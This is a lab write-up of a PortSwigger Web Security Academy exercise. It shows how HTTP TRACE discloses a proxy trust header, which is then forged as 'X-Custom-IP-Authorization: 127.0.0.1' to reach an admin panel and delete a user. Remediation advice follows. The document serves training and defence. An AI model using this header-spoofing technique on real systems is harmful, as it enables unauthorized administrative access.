# Lab 04 — Authentication Bypass via Information Disclosure

[![Category](https://img.shields.io/badge/Category-Information%20Disclosure-blue)]()
[![Type](https://img.shields.io/badge/Type-Information%20Disclosure%20to%20Authentication%20Bypass-orange)]()
[![Severity](https://img.shields.io/badge/Severity-Critical-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/information-disclosure)

> Part of the [Information Disclosure Labs](./README.md) series — PortSwigger Web Security Academy.

---

## 1. Overview

| Field | Detail |
|---|---|
| **Lab Name** | Authentication Bypass via Information Disclosure |
| **Vulnerability Class** | Information Disclosure → Authentication Bypass |
| **Weakness (CWE)** | CWE-290: Authentication Bypass by Spoofing |
| **Severity** | Critical |
| **Objective** | Discover an internal trust header used by the front-end proxy via the HTTP TRACE method, then forge it to bypass authentication on the admin panel and delete user carlos. |

## 2. Summary

The back-end grants administrative access to any request it believes originates from `localhost` (127.0.0.1), based on a custom header (`X-Custom-IP-Authorization`) injected by the front-end reverse proxy. Because the HTTP `TRACE` method echoes the exact request the server received (after proxy modification) back to the client, it inadvertently discloses the name — and live value — of this trusted internal header.

## 3. Proof of Concept (PoC)

**Step 1 — Probe the protected endpoint:**  
`GET /admin` returns an error stating the panel is only available to administrators or local IPs.

**Step 2 — Use TRACE to force an echo:**  
Resend the request with the `TRACE` method instead of `GET`:

```http
TRACE /admin HTTP/2
```

The response echoes back the exact request the backend received, revealing a header appended by the proxy: `X-Custom-IP-Authorization: <your IP>`.

**Step 3 — Forge the header:**  
In Burp, go to **Proxy → Match and Replace** (or manually add it in Repeater) and inject:

```http
X-Custom-IP-Authorization: 127.0.0.1
```

on every outgoing request.

**Step 4 — Access the admin panel and exploit:**  
Request `GET /admin` again — the server now treats the request as local and grants access. Locate the delete link and request it directly:

```http
GET /admin/delete?username=carlos HTTP/2
X-Custom-IP-Authorization: 127.0.0.1
```


## 4. Evidence (Request / Response)

```http
TRACE /admin HTTP/2
Host: <lab-id>.web-security-academy.net

HTTP/2 200 OK
TRACE /admin HTTP/2
Host: <lab-id>.web-security-academy.net
X-Custom-IP-Authorization: <your real IP>
...

--- after forging the header ---

GET /admin/delete?username=carlos HTTP/2
Host: <lab-id>.web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1

HTTP/2 302 Found
Location: /admin
```

## 5. Root Cause Analysis

The backend's authorization decision is delegated to a client-influenceable trust signal (an HTTP header), and the diagnostic `TRACE` method was left enabled, allowing the attacker to discover the exact name and format of that internal header simply by having it echoed back. The combination of an undisclosed trust header plus a method that discloses it completely undermines the IP-based access control.

### Attacker vs. Defender Perspective

- **Attacker view:** Use diagnostic HTTP methods like TRACE to get the server to echo back internal headers injected by the proxy, then forge them.
- **Defender view:** Disable TRACE in production and never let proxy-injected trust headers be discoverable or spoofable by the client.

## 6. Impact

Full authentication bypass of the administrative interface, leading to complete compromise of all admin-only functionality (here, arbitrary user deletion) without ever authenticating.

## 7. Remediation

- Disable the `TRACE` (and `TRACK`) HTTP method on all production web servers — it has no legitimate use case there.
- Never use client-supplied or proxy-injected headers alone to establish trust/privilege; the reverse proxy must strip any client-supplied value for internal trust headers before adding its own.
- Prefer strong, server-side session-based authentication/authorization over any form of IP-based or header-based trust shortcuts.
- Apply the principle of least trust: sensitive internal signaling headers should never be able to reach the client in any response, under any method.

## 8. References

- [PortSwigger — Information Disclosure](https://portswigger.net/web-security/information-disclosure)
- [OWASP Top 10 2021 — A01/A05: Broken Access Control / Security Misconfiguration](https://owasp.org/Top10/)
- [CWE-290: Authentication Bypass by Spoofing](https://cwe.mitre.org/data/definitions/290.html)

---

*Writeup produced for educational and authorized lab purposes only (PortSwigger Web Security Academy environment).*
